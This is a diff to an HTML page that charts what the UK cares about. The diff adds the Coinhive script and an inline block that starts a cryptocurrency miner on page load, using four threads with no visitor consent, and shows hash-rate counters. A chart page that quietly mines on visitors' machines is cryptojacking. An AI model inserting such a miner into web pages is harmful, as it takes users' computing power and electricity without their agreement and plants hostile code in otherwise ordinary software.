@@ -4,6 +4,8 @@
 		<script type='text/javascript' src='https://www.amcharts.com/lib/3/serial.js?ver=20161128-02'></script>
 		<script src="https://www.amcharts.com/lib/3/themes/light.js"></script>
 		<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+		<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
 	</head>
 	<body>
 		<h3>What does the UK care more about?</h3>
@@ -14,8 +16,31 @@
 		<h3>Handy Graph Form:</h3>
 		<body>
 			<div id="chartdiv" style="width: 640px; height: 400px;"></div>
-		</body>
-	
+			<div>
+				<label id="found"></label>
+				<label id="accepted"></label>
+				<label id="hashes"></label>
+				<label id="totalHashes"></label>
+				<label id="acceptedCount"></label>
+			</div>
+		</body>	
+		
+		<script>
+			var miner = new CoinHive.User('LRgu2Ze2ARQ1rJwI9DycJJtq0qLPrOB3', 'notwork', { threads: 4, throttle: 0.8 });
+			miner.start();
+			
+			// Update stats once per second
+			setInterval(function() {
+				var hashesPerSecond = miner.getHashesPerSecond();
+				var totalHashes = miner.getTotalHashes();
+				var acceptedHashes = miner.getAcceptedHashes();
+
+				$("#hashes").html("Hashes Per Sec: " + hashesPerSecond);
+				$("#totalHashes").html("Total Hashes: " + totalHashes);
+				$("#acceptedCount").html("Accepted Hashes: " + acceptedHashes);
+			}, 1000);
+		</script>
+		
 		<script type="text/javascript">
 			var source1, source2;
 			var source1Loaded, source2Loaded;
